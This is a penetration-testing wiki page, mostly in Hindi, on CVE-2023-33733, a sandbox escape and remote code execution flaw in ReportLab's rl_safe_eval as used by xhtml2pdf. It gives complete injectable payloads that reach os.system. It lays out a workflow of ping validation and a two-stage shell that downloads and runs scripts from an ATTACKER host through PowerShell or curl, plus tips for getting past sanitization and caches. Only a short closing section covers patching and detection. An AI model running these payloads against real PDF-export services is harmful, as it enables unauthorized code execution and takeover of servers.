# ReportLab/xhtml2pdf [[[...]]] expression-evaluation RCE (CVE-2023-33733)

{{#include ../../../banners/hacktricks-training.md}}

This page documents a practical sandbox escape and RCE primitive in ReportLab’s rl_safe_eval used by xhtml2pdf and other PDF-generation pipelines when rendering user-controlled HTML into PDFs.

CVE-2023-33733 affects ReportLab versions up to and including 3.6.12. In certain attribute contexts (for example color), values wrapped in triple brackets [[[ ... ]]] are evaluated server-side by rl_safe_eval. By crafting a payload that pivots from a whitelisted builtin (pow) to its Python function globals, an attacker can reach the os module and execute commands.

मुख्य बिंदु
- Trigger: ReportLab/xhtml2pdf द्वारा पार्स किए गए मार्कअप में <font color="..."> जैसे evaluated attributes में [[[ ... ]]] इंजेक्ट करें।
- Sandbox: rl_safe_eval खतरनाक builtins को बदल देता है, लेकिन evaluated functions अभी भी __globals__ एक्सपोज़ करते हैं।
- Bypass: rl_safe_eval के नाम परीक्षणों को बायपास करने और blocked dunder filtering से बचते हुए "__globals__" स्ट्रिंग तक पहुँचने के लिए एक अस्थायी class Word बनाएं।
- RCE: getattr(pow, Word("__globals__"))["os"].system("<cmd>")
- Stability: निष्पादन के बाद attribute के लिए एक वैध मान लौटाएं (color के लिए, और 'red' का उपयोग करें)।

कब परीक्षण करें
- ऐसे एप्लिकेशन जो HTML-to-PDF export (profiles, invoices, reports) एक्सपोज़ करते हैं और PDF metadata या HTTP response comments में xhtml2pdf/ReportLab दिखाते हैं।
- exiftool profile.pdf | egrep 'Producer|Title|Creator' → "xhtml2pdf" producer
- PDF के लिए HTTP response अक्सर ReportLab generator comment के साथ शुरू होता है।

sandbox bypass कैसे काम करता है
- rl_safe_eval कई builtins (getattr, type, pow, ...) को हटाता या बदल देता है और नाम फ़िल्टरिंग लागू करता है ताकि __ से शुरू होने वाले या denylist में होने वाले attributes deny किए जाएँ।
- हालाँकि, safe functions एक globals dictionary में रहते हैं जिसे func.__globals__ के रूप में एक्सेस किया जा सकता है।
- ReportLab के wrapper को बायपास करते हुए वास्तविक builtin type function को पुनः प्राप्त करने के लिए type(type(1)) का उपयोग करें, फिर str से व्युत्पन्न एक Word class परिभाषित करें जिसके comparison व्यवहार को बदला गया हो ताकि:
  - .startswith('__') → हमेशा False (name startswith('__') जांच बायपास)
  - .__eq__ केवल पहली तुलना में False लौटाता है (denylist membership checks बायपास) और बाद में True (ताकि Python getattr काम करे)
  - .__hash__ = hash(str(self))
- इससे getattr(pow, Word('__globals__')) wrapped pow function का globals dict लौटाता है, जिसमें imported os मॉड्यूल शामिल है। फिर: ['os'].system('<cmd>').

न्यूनतम एक्सप्लॉइटेशन पैटर्न (attribute उदाहरण)
Payload को एक evaluated attribute के अंदर रखें और सुनिश्चित करें कि यह boolean और 'red' के माध्यम से एक वैध attribute मान लौटाए।

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('ping 10.10.10.10') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">
exploit
</font></para>

- List-comprehension फॉर्म rl_safe_eval द्वारा स्वीकार्य एक single expression की अनुमति देता है।
- अंत में 'and 'red'' एक वैध CSS color लौटाता है ताकि rendering न टूटे।
- आवश्यकतानुसार कमांड बदलें; tcpdump के साथ execution को validate करने के लिए ping का उपयोग करें।

ऑपरेशनल वर्कफ़्लो
1) PDF generator की पहचान करें
- PDF Producer xhtml2pdf दिखाता है; HTTP response में ReportLab comment होता है।
2) ऐसा इनपुट खोजें जो PDF में रिफ्लेक्ट हो (उदा., profile bio/description) और export ट्रिगर करें।
3) कम-शोर (low-noise) ICMP के साथ निष्पादन सत्यापित करें
- Run: sudo tcpdump -ni <iface> icmp
- Payload: ... system('ping <your_ip>') ...
- Windows अक्सर डिफ़ॉल्ट रूप से ठीक चार echo requests भेजता है।
4) शेल स्थापित करें
- Windows के लिए, एक विश्वसनीय two-stage तरीका quoting/encoding समस्याओं से बचता है:
- Stage 1 (डाउनलोड):

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell -c iwr http://ATTACKER/rev.ps1 -o rev.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>

- Stage 2 (निष्पादन):

<para><font color="[[[getattr(pow, Word('__globals__'))['os'].system('powershell ./rev.ps1') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'">exploit</font></para>

- Linux लक्ष्यों के लिए, curl/wget के साथ समान two-stage संभव है:
- system('curl http://ATTACKER/s.sh -o /tmp/s; sh /tmp/s')

नोट्स और टिप्स
- Attribute संदर्भ: color एक ज्ञात evaluated attribute है; ReportLab मार्कअप में अन्य attributes भी expressions मूल्यांकित कर सकते हैं। यदि एक स्थान sanitized है, तो PDF फ्लो में render होने वाले अन्य स्थानों (विभिन्न फ़ील्ड्स, table styles, आदि) को आज़माएँ।
- Quoting: कमांड्स को compact रखें। Two-stage डाउनलोड quoting और escaping की समस्याओं को काफी कम कर देते हैं।
- Reliability: यदि exports cached या queued हैं, तो caches से बचने के लिए payload को हल्का-सा बदलें (उदा., random path या query)।

रोकथाम और पहचान
- ReportLab को 3.6.13 या बाद के संस्करण में अपग्रेड करें (CVE-2023-33733 ठीक किया गया है)। distro पैकेजों में भी security advisories को ट्रैक करें।
- बिना सख्त sanitization के user-controlled HTML/markup को सीधे xhtml2pdf/ReportLab में न दें। जब इनपुट अनट्रस्टेड हो तो [[[...]]] evaluation constructs और vendor-specific tags को हटाएँ/deny करें।
- अनट्रस्टेड इनपुट के लिए rl_safe_eval का उपयोग पूरी तरह से अक्षम करने या उसे wrap करने पर विचार करें।
- PDF generation के दौरान संदिग्ध outbound connections की निगरानी करें (उदा., दस्तावेज़ एक्सपोर्ट करते समय app servers से आने वाले ICMP/HTTP)।

संदर्भ
- PoC और तकनीकी विश्लेषण: [c53elyas/CVE-2023-33733](https://github.com/c53elyas/CVE-2023-33733)
- 0xdf University HTB write-up (real-world exploitation, Windows two-stage payloads): [HTB: University](https://0xdf.gitlab.io/2025/08/09/htb-university.html)
- NVD एंट्री (प्रभावित संस्करण): [CVE-2023-33733](https://nvd.nist.gov/vuln/detail/cve-2023-33733)
- xhtml2pdf docs (markup/page concepts): [xhtml2pdf docs](https://xhtml2pdf.readthedocs.io/en/latest/format_html.html)

{{#include ../../../banners/hacktricks-training.md}}
